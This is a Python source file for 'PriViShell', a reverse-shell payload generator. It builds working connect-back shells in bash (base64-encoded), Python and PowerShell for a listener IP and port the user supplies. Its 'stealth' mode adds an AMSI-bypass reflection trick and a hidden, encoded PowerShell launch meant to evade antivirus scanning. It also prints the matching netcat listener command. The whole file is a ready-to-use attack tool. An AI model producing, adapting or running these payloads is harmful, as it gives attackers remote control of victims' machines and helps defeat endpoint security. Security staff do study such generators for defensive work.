#!/usr/bin/env python3
import base64
import re
from colorama import Fore, Style, init

init(autoreset=True)

class PriViShell:
    def __init__(self):
        self.banner = (
            f"\n{Fore.CYAN}  ██████╗ ██████╗ ██╗██╗   ██╗██╗███████╗██╗  ██╗███████╗██╗     ██╗\n"
            f"{Fore.CYAN}  ██╔══██╗██╔══██╗██║██║   ██║██║██╔════╝██║  ██║██╔════╝██║     ██║\n"
            f"{Fore.CYAN}  ██████╔╝██████╔╝██║██║   ██║██║███████╗███████║█████╗  ██║     ██║\n"
            f"{Fore.CYAN}  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝ ██║╚════██║██╔══██║██╔══╝  ██║     ██║\n"
            f"{Fore.CYAN}  ██║     ██║  ██║██║ ╚████╔╝  ██║███████║██║  ██║███████╗███████╗███████╗\n"
            f"{Fore.RED}  PriViSecurity | PriViShell v2.0 [STEALTH] | Developed by Prince Ubebe\n"
            f"{Fore.YELLOW}  {'=' * 75}\n"
        )

    def generate_bash(self, ip, port):
        raw = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        b64 = base64.b64encode(raw.encode()).decode()
        return f"echo {b64} | base64 -d | bash"

    def generate_python(self, ip, port):
        raw = (f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
               f"s.connect(('{ip}',{int(port)}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
               f"os.dup2(s.fileno(),2);pty.spawn('/bin/bash')")
        return f"python3 -c \"{raw}\""

    def generate_powershell(self, ip, port, stealth=False):
        ps_shell = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                    f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                    f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                    f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$r=(iex $d 2>&1 | Out-String );$t=$r+'PS '+(pwd).Path+'> ';"
                    f"$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};"
                    f"$c.Close()")

        if stealth:
            bypass = ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                      ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
            combined = f"{bypass}; {ps_shell}"
            encoded_ps = base64.b64encode(combined.encode('utf-16-le')).decode()
            print(Fore.YELLOW + "    [~] Note: AMSI bypass uses amsiInitFailed reflection.")
            return f"powershell -NoP -NonI -W Hidden -Enc {encoded_ps}"
        else:
            return f"powershell -NoP -NonI -c \"{ps_shell}\""

    def save_to_file(self, content, extension, lport):
        filename = f"PriVi_Payload.{extension}"
        try:
            with open(filename, "w") as f:
                f.write(content)
            print(f"\n{Fore.GREEN}[+] Success! {Fore.WHITE}{filename} {Fore.GREEN}saved.")
            print(f"{Fore.MAGENTA}[*] Start your listener: {Fore.WHITE}nc -lvnp {lport}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error writing file: {e}")

def validate_ip(ip):
    ipv4 = re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip)
    hostname = re.match(r'^[a-zA-Z0-9._-]+$', ip)
    if not (ipv4 or hostname): return False
    if ipv4:
        parts = ip.split('.')
        if any(int(p) > 255 for p in parts): return False
    return True

def main():
    gen = PriViShell()
    print(gen.banner)

    lhost = input(f"{Fore.GREEN}Enter LHOST (Your IP): {Style.RESET_ALL}").strip()
    lport = input(f"{Fore.GREEN}Enter LPORT (Your Port): {Style.RESET_ALL}").strip()

    try:
        port_int = int(lport)
        if not (1 <= port_int <= 65535): raise ValueError
    except ValueError:
        print(f"{Fore.RED}[!] Invalid port. Must be 1-65535.")
        return

    if not lhost or not validate_ip(lhost):
        print(f"{Fore.RED}[!] Invalid LHOST.")
        return

    print(f"\n{Fore.YELLOW}Select Target Payload:")
    print("  1. Linux Bash (Base64 Encoded)")
    print("  2. Python3 (PTY Spawn)")
    print("  3. Windows PowerShell (Standard)")
    print("  4. Windows PowerShell (Stealth + AMSI Bypass)")

    choice = input(f"\n{Fore.CYAN}Choice [1-4]: {Style.RESET_ALL}").strip()

    payload, ext = "", ""
    if choice == "1": payload, ext = gen.generate_bash(lhost, lport), "sh"
    elif choice == "2": payload, ext = gen.generate_python(lhost, lport), "py"
    elif choice == "3": payload, ext = gen.generate_powershell(lhost, port_int, stealth=False), "ps1"
    elif choice == "4": payload, ext = gen.generate_powershell(lhost, port_int, stealth=True), "ps1"
    else: return

    print(f"\n{Fore.CYAN}Payload generated.")
    print("  1. Output to Screen")
    print(f"  2. Save to File (PriVi_Payload.{ext})")

    out_choice = input(f"\n{Fore.CYAN}Select [1-2]: {Style.RESET_ALL}").strip()
    if out_choice == "1":
        print(f"\n{Fore.GREEN}[+] PAYLOAD:\n{Fore.WHITE}{payload}")
        print(f"\n{Fore.MAGENTA}[*] Required Listener: {Fore.WHITE}nc -lvnp {lport}")
    elif out_choice == "2":
        gen.save_to_file(payload, ext, lport)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{Fore.YELLOW}[!] Exit requested.")
                    
